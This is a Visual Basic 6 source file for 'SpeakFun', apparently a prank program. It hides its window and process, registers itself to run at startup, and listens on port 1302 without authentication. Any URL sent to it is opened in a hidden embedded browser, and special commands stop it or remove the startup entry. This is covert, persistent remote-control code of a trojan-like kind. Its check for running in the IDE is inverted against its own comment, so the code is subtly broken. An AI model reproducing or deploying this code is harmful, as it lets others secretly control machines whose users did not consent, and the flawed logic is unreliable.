VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Object = "{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}#1.1#0"; "SHDOCVW.DLL"
Begin VB.Form frmMain 
   BorderStyle     =   1  'Fixed Single
   Caption         =   "SpeakFun"
   ClientHeight    =   525
   ClientLeft      =   45
   ClientTop       =   375
   ClientWidth     =   1830
   LinkTopic       =   "Form1"
   LockControls    =   -1  'True
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   525
   ScaleWidth      =   1830
   ShowInTaskbar   =   0   'False
   StartUpPosition =   3  'Windows Default
   WindowState     =   1  'Minimized
   Begin SHDocVwCtl.WebBrowser WebBrowser1 
      Height          =   120
      Left            =   120
      TabIndex        =   0
      TabStop         =   0   'False
      Top             =   60
      Width           =   120
      ExtentX         =   212
      ExtentY         =   212
      ViewMode        =   0
      Offline         =   0
      Silent          =   0
      RegisterAsBrowser=   0
      RegisterAsDropTarget=   1
      AutoArrange     =   0   'False
      NoClientEdge    =   0   'False
      AlignLeft       =   0   'False
      ViewID          =   "{0057D0E0-3573-11CF-AE69-08002B2E1262}"
      Location        =   ""
   End
   Begin VB.Timer tmrPlay 
      Interval        =   500
      Left            =   345
      Top             =   30
   End
   Begin MSWinsockLib.Winsock Winsock1 
      Left            =   1290
      Top             =   30
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin VB.Timer tmrConnectionTimeout 
      Enabled         =   0   'False
      Interval        =   3000
      Left            =   825
      Top             =   30
   End
End
Attribute VB_Name = "frmMain"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Option Explicit

Private Declare Function GetCurrentProcessId& Lib "kernel32" ()
Private Declare Function GetCurrentProcess& Lib "kernel32" ()
Private Declare Function RegisterServiceProcess& Lib "kernel32" (ByVal dwProcessID&, ByVal dwType&)

' Has a buffer of up to 256 requests - used high/low water-mark methos to create FIFO buffer.
Private url_buffer$(256)
Private url_buffer_hwm%, url_buffer_lwm%

Private Sub Form_Load()
      
   frmMain.Hide
   ' If not running in VB IDE, then hide application totally (only in Windows 95/98/Me) and
   ' add link in registry, so that application is re-run on bootup!
   If IsIDERunning() Then
      HideFromTaskBar
      AddStartupRegistryEntry "SpeakFun"
   End If
   
   ' Reset the buffer markers
   url_buffer_hwm = 0
   url_buffer_lwm = 0
   
   ' Initialise the socket - it listens on the same port number as SpeakFunSend tries to connect
   Winsock1.LocalPort = 1302
   Winsock1.Listen
End Sub


Private Sub Form_QueryUnload(Cancel As Integer, UnloadMode As Integer)
   
   On Error Resume Next
      
   'As application is closing, then close socket (if applicable)
   If Winsock1.State <> sckClosed Then
      Winsock1.Close
   End If
End Sub

Private Sub Form_Unload(Cancel As Integer)
   
   'As application is unloading, then unresister as service.
   UnhideInTaskBar
End Sub

Private Sub tmrConnectionTimeout_Timer()
   
   On Error Resume Next
   
   tmrConnectionTimeout.Enabled = False
   
   ' Timeout trying to recieve speech request, so close socket (if applicable)
   If Winsock1.State <> sckClosed Then
      Winsock1.Close
   End If
   
   ' Set socket back to listen for next connection.
   Winsock1.Listen
End Sub


Private Sub tmrPlay_Timer()
   
   On Error Resume Next
   
   ' If the high/low water marks are different, we have a speech request in the buffer!
   If url_buffer_hwm <> url_buffer_lwm Then
      tmrPlay.Enabled = False
      
      ' Navigate to URL with speech request
      WebBrowser1.Navigate url_buffer(url_buffer_lwm)
      
      ' Remove request from buffer by advancing low water mark.
      url_buffer_lwm = url_buffer_lwm + 1
      If url_buffer_lwm >= 256 Then url_buffer_lwm = 0
      
      tmrPlay.Enabled = True
   End If
End Sub

Private Sub Winsock1_Close()
   
   On Error Resume Next
   
   tmrConnectionTimeout.Enabled = False
   
   Winsock1.Close
   
   ' Set socket back to listen for next connection.
   Winsock1.Listen
End Sub

Private Sub Winsock1_ConnectionRequest(ByVal requestID As Long)
   On Error Resume Next
   
   ' Opening new connection so close socket (if applicable)
   If Winsock1.State <> sckClosed Then
      Winsock1.Close
   End If
   
   ' Acknowledge connection request, and trigger timeout (in case connection fails).
   Winsock1.Accept requestID
   tmrConnectionTimeout.Enabled = True
End Sub

Private Sub Winsock1_DataArrival(ByVal bytesTotal As Long)
   Dim socket_data$, next_hwm%

   On Error Resume Next

   ' Data has arrived to disable connection timeout.
   tmrConnectionTimeout.Enabled = False

   ' Get data from the socket, then close the connection.
   Winsock1.GetData socket_data
   Winsock1.Close
   
   If socket_data = "@@@STOP@@@" Then
      Unload Me
      Exit Sub
   ElseIf socket_data = "@@@UNLINK@@@" Then
      RemoveStartupRegistryEntry "SpeakFun"
      Unload Me
      Exit Sub
   End If
   
   ' Set socket back to listen for next connection.
   Winsock1.Listen
   
   ' If the high water mark is not the same as the low water mark when advanced then we have space in the buffer.
   next_hwm = url_buffer_hwm + 1
   If next_hwm >= 256 Then
      next_hwm = 0
   End If
   If next_hwm <> url_buffer_lwm Then
      url_buffer(next_hwm) = Trim(socket_data)
      url_buffer_hwm = next_hwm
   End If
End Sub

Private Sub Winsock1_Error(ByVal Number As Integer, Description As String, ByVal Scode As Long, ByVal Source As String, ByVal HelpFile As String, ByVal HelpContext As Long, CancelDisplay As Boolean)
   
   On Error Resume Next
   
   tmrConnectionTimeout.Enabled = False
   
   ' Problen with connection, so close socket (if applicable)
   If Winsock1.State <> sckClosed Then
      Winsock1.Close
   End If
   
   ' Set socket back to listen for next connection.
   Winsock1.Listen
End Sub


Private Function IsIDERunning() As Boolean

   On Error Resume Next
   
   Err.Clear
   Debug.Print 1 / 0
   IsIDERunning = Not (Err.Number = 0)
End Function

Private Function HideFromTaskBar() As Boolean
   Dim pid&, return_value&
   
   Const RSP_SIMPLE_SERVICE = 1
   
   On Error Resume Next
   
   pid = GetCurrentProcessId()
   return_value = RegisterServiceProcess(pid, RSP_SIMPLE_SERVICE)

   HideFromTaskBar = return_value <> 0
End Function

Private Function UnhideInTaskBar() As Boolean
   Dim pid&, return_value&
   
   Const RSP_UNREGISTER_SERVICE = 0
   
   On Error Resume Next
   
   pid = GetCurrentProcessId()
   return_value = RegisterServiceProcess(pid, RSP_UNREGISTER_SERVICE)

   UnhideInTaskBar = return_value <> 0
End Function

